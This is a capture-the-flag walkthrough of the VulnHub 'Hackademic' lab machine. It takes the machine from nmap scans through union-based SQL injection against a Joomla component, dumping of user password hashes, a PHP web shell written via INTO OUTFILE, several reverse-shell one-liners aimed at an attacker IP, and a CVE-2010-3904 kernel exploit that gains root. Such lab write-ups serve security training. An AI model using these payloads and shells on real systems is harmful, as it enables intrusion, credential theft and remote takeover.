# __Hackademic: RTB1__
[Link to vulnhub](https://www.vulnhub.com/entry/hackademic-rtb1,17/)

## Reconnaissance
```
nmap -sS -O 192.168.175.0/24

Nmap scan report for 192.168.175.141
Host is up (0.00044s latency).
Not shown: 998 closed ports
PORT    STATE    SERVICE
80/tcp  open     http
666/tcp filtered doom
MAC Address: 00:0C:29:5C:B9:FA (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.17 - 2.6.36
Network Distance: 1 hop

```

You may see TCP 666 is filtered.

## __Enumeration__
```
nmap -sV -A --script vuln -p- -v 192.168.175.141

Nmap scan report for 192.168.175.141
Host is up (0.00049s latency).
Not shown: 65533 closed ports
PORT    STATE    SERVICE VERSION
80/tcp  open     http    Apache httpd 2.2.14 ((Ubuntu))
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.175.141
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://192.168.175.141:80/
|     Form id: username
|_    Form action: check.php
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /phpmyadmin/: phpMyAdmin
|   /icons/: Potentially interesting folder w/ directory listing
|_  /index/: Potentially interesting folder
|_http-server-header: Apache/2.2.14 (Ubuntu)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
666/tcp filtered doom
```

After finishing Nmap scan I've found nothing useful. The open TCP port is only 80. Then let's check it out.

I found that it's some hard-code credential. If I supply **' or 1=1--'** the web site will return with different answer **Ok, nice shot......but, you are looking in a wrong place bro! ;-)**.

I run Nmap with **nmap -sV -A --script vuln -p- -v 192.168.175.141** again and then the TCP 666 is suddenly open.

After site crawling I found a URL which is vulnerable to SQLi.
```
http://192.168.175.141:666/index.php?option=com_abc&view=abc&Itemid=3&sectionid=1 union select 1,2--&letter=A
```



## __Exploit__

The following are SQLi statement and the result
* Current database
```
http://192.168.175.141:666/index.php?option=com_abc&view=abc&Itemid=3&sectionid=1 union select 1,database() FROM information_schema.schemata--&letter=A

joomla
```

* List database
```
http://192.168.175.141:666/index.php?option=com_abc&view=abc&Itemid=3&sectionid=1 union select 1,group_concat(schema_name)--&letter=A
```

* List table in database joomla
```
http://192.168.175.141:666/index.php?option=com_abc&view=abc&Itemid=3&sectionid=1 union select 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=CHAR(106, 111, 111, 109, 108, 97)--&letter=A

http://192.168.175.141:666/index.php?option=com_abc&view=abc&Itemid=3&sectionid=1 union select 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=CHAR(106, 111, 111, 109, 108, 97) AND table_name NOT IN ("jos_banner","jos_bannerclient","jos_bannertrack","jos_categories","jos_components","jos_contact_details","jos_content","jos_content_frontpage","jos_content_rating","jos_core_acl_aro","jos_core_acl_aro_groups","jos_core_acl_aro_map","jos_core_acl_aro_sections","jos_core_acl_groups_aro_map","jos_core_log_items","jos_core_log_searches","jos_groups","jos_menu","jos_menu_types")--&letter=A

jos_messages,jos_messages_cfg,jos_migration_backlinks,jos_modules,jos_modules_menu,jos_newsfeeds,jos_plugins,jos_poll_data,jos_poll_date,jos_poll_menu,jos_polls,jos_sections,jos_session,jos_stats_agents,jos_template_banner,jos_templates_menu,jos_users,jos_weblinks

Tables:
jos_banner
jos_bannerclient
jos_bannertrack
jos_categories
jos_components
jos_contact_details
jos_content
jos_content_frontpage
jos_content_rating
jos_core_acl_aro
jos_core_acl_aro_groups
jos_core_acl_aro_map
jos_core_acl_aro_sections
jos_core_acl_groups_aro_map
jos_core_log_items
jos_core_log_searches
jos_groups
jos_menu
jos_menu_types
jos_messages
jos_messages_cfg
jos_migration_backlinks
jos_modules
jos_modules_menu
jos_newsfeeds
jos_plugins
jos_poll_data
jos_poll_date
jos_poll_menu
jos_polls
jos_sections
jos_session
jos_stats_agents
jos_template_banner
jos_templates_menu
jos_users
jos_weblinks
```

* List column name of wp_users table
```
http://192.168.175.141:666/index.php?option=com_abc&view=abc&Itemid=3&sectionid=1 union select 1,group_concat(column_name) FROM information_schema.columns WHERE table_schema=CHAR(106, 111, 111, 109, 108, 97) AND table_name = CHAR(106, 111, 115, 95, 117, 115, 101, 114, 115)--&letter=A

id,name,username,email,password,usertype,block,sendEmail,gid,registerDate,lastvisitDate,activation,params
```

* Dump data name,username,email,password,usertype
```
http://192.168.175.141:666/index.php?option=com_abc&view=abc&Itemid=3&sectionid=1 union select 1,group_concat(name,CHAR(44),username,CHAR(44),email,CHAR(44),password,CHAR(44),usertype,CHAR(59)) FROM joomla.jos_users--&letter=A

Administrator,Administrator,admin@hackademirtb2.com,08f43b7f40fb0d56f6a8fb0271ec4710:n9RMVci9nqTUog3GjVTNP7IuOrPayqAl,Super Administrator;
,John Smith,JSmith,JSmith@hackademicrtb.com,992396d7fc19fd76393f359cb294e300:70NFLkBrApLamH9VNGjlViJLlJsB60KF,Registered;
,Billy Tallor,BTallor,BTallor@hackademic.com,abe1ae513c16f2a021329cc109071705:FdOr
```

After take some time for SQLi you may decrypt administrator password and gain access to Joomla administrative page. But after check other ways I found that the MySql user has privilege to create file in /var/www/. I tested by guessing the path by create phpinfo page at /var/www/info.php
```
http://192.168.175.141:666/index.php?option=com_abc&view=abc&Itemid=3&sectionid=1 union select 1,CHAR(60, 63, 112, 104, 112, 32, 112, 104, 112, 105, 110, 102, 111, 40, 41, 59, 63, 62) INTO OUTFILE "/var/www/info.php"--&letter=A

http://192.168.175.141:666/info.php
```

So I managed to get shell via this method.
* PHP Code
```php
<?php system($_GET["cmd"]);?>
```

* MySQL encoded
```
CHAR(60, 63, 112, 104, 112, 32, 115, 121, 115, 116, 101, 109, 40, 36, 95, 71, 69, 84, 91, 34, 99, 109, 100, 34, 93, 41, 59, 63, 62)
```

* Construct exploit
```
http://192.168.175.141:666/index.php?option=com_abc&view=abc&Itemid=3&sectionid=1 union select 1,CHAR(60, 63, 112, 104, 112, 32, 115, 121, 115, 116, 101, 109, 40, 36, 95, 71, 69, 84, 91, 34, 99, 109, 100, 34, 93, 41, 59, 63, 62) INTO OUTFILE "/var/www/shell.php"--&letter=A
```

* Access our shell
```
http://192.168.175.141:666/shell.php?cmd=id


1 uid=33(www-data) gid=33(www-data) groups=33(www-data) 
```


* Get reverse shell
```
[-] bash -i >& /dev/tcp/192.168.175.128/9991 0>&1

[-] nc -e /bin/sh 192.168.175.128 9991

[-] rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.175.128 9991 >/tmp/f

[-] php -r '$sock=fsockopen("192.168.175.128",9991);exec("/bin/sh -i <&3 >&3 2>&3");'

[-] perl -e 'use Socket;$i="192.168.175.128";$p=9991;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

[+] python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.175.128",9991));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ ps
  PID TTY          TIME CMD
 1022 ?        00:00:02 apache2
 1023 ?        00:00:02 apache2
 1024 ?        00:00:03 apache2
 1025 ?        00:00:02 apache2
 1026 ?        00:00:03 apache2
 1349 ?        00:00:02 apache2
 1351 ?        00:00:02 apache2
 1352 ?        00:00:02 apache2
 1353 ?        00:00:02 apache2
 1355 ?        00:00:02 apache2
 1409 ?        00:00:00 sh
 1410 ?        00:00:00 python
 1411 ?        00:00:00 sh
 1413 ?        00:00:00 ps
```

* Shell jailbreaking to TTY
```
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@HackademicRTB2:/var/www$ ps
ps
  PID TTY          TIME CMD
 1415 pts/0    00:00:00 bash
 1418 pts/0    00:00:00 ps
```

## __Privilege escalation__
Same as previous EP RTB1. The machine is using vulnerable pkexec version
```
www-data@HackademicRTB2:/var/www$ pkexec --version
pkexec --version
pkexec version 0.96

www-data@HackademicRTB2:/tmp$ uname -a
uname -a
Linux HackademicRTB2 2.6.32-24-generic #39-Ubuntu SMP Wed Jul 28 06:07:29 UTC 2010 i686 GNU/Linux
```


* polkit-pwnage.c (Failed) (CVE-2011-1485) - https://git.zx2c4.com/CVE-2011-1485/tree/polkit-pwnage.c
```
vi polkit-pwnage.c
gcc polkit-pwnage.c -o polkit-pwnage
chmod +x polkit-pwnage
./polkit-pwnage

www-data@HackademicRTB2:/tmp$ Error determing pid of caller (pid 1458): stat() failed for /proc/1458: No such file or directory
```

By the way, Linux 2.6.32-24-generic is vulnerable to CVE-2010-3904 then let's try it.
* 15285.c (Work!) (CVE-2010-3904) - https://www.exploit-db.com/exploits/15285/
```
vi 15285.c
gcc 15285.c -o 15285
chmod +x 15285
./15285

www-data@HackademicRTB2:/tmp$ ./15285
./15285
[*] Linux kernel >= 2.6.30 RDS socket exploit
[*] by Dan Rosenberg
[*] Resolving kernel addresses...
 [+] Resolved security_ops to 0xc08cac4c
 [+] Resolved default_security_ops to 0xc0773340
 [+] Resolved cap_ptrace_traceme to 0xc02f5060
 [+] Resolved commit_creds to 0xc016dd80
 [+] Resolved prepare_kernel_cred to 0xc016e0c0
[*] Overwriting security ops...
[*] Overwriting function pointer...
[*] Triggering payload...
[*] Restoring function pointer...
[*] Got root!
# id
id
uid=0(root) gid=0(root)
# ls -al /root
ls -al /root
total 120
drwx------ 13 root root  4096 Jan 29  2011 .
drwxr-xr-x 22 root root  4096 Dec 29 12:30 ..
-rw-------  1 root root     5 Jan 25  2011 .bash_history
-rw-r--r--  1 root root  3106 Apr 23  2010 .bashrc
drwx------  4 root root  4096 Jan 22  2011 .config
drwx------  3 root root  4096 Jan 29  2011 .gconf
drwx------  2 root root  4096 Jan 29  2011 .gconfd
drwxr-xr-x  7 root root  4096 Jan 27  2011 .gnome2
drwx------  2 root root  4096 Jan 27  2011 .gnome2_private
drwx------  3 root root  4096 Jan 17  2011 .local
drwxr-xr-x  2 root root  4096 Jan 17  2011 .nautilus
-rw-r--r--  1 root root   140 Apr 23  2010 .profile
drwx------  2 root root  4096 Jan 17  2011 .pulse
-rw-------  1 root root   256 Jan 17  2011 .pulse-cookie
-rw-------  1 root root 14102 Jan 29  2011 .recently-used.xbel
drwx------  3 root root  4096 Jan 17  2011 .thumbnails
drwxr-xr-x  2 root root  4096 Aug 16  2010 .wapi
drwxr-xr-x  2 root root  4096 Jan 17  2011 Desktop
-rwxr-xr-x  1 root root 33921 Jan 22  2011 Key.txt
# cat /root/Key.txt
cat /root/Key.txt
iVBORw0KGgoAAAANSUhEUgAAAvQAAAFYCAIAAACziP9JAAAACXBIWXMAAAsTAAALEwEAmpwYAAAg
AElEQVR4nOy9eZhdVZXw/bu35iFVlXmgUiQhBAIJEGKMAQGDb1rpbj5EjYK8KIoy+SniIyC2Q4uC
Nn5tOzI4dAvaKI2CLTgEWmYIGTCBQAbIUEkqVZWa5+lO3x/nXefdt4Y71D3DvbfW78nDk1C3zll3
n332XnuNoCiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiK
oiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiK
oiiKovhOwG8BlNynAM6AEYhCBGLQCd0Q8lswRVEUZUoS9FsAJfcphUIIQBAKICBajqIoiqL4gSo3
SsYUi1oTlAkVgajPQimKoihTFlVulIyJicHG+m9MzTaKoiiKn6hyoziBpdlguKUURVEUxScK/RZA
... snip ...
```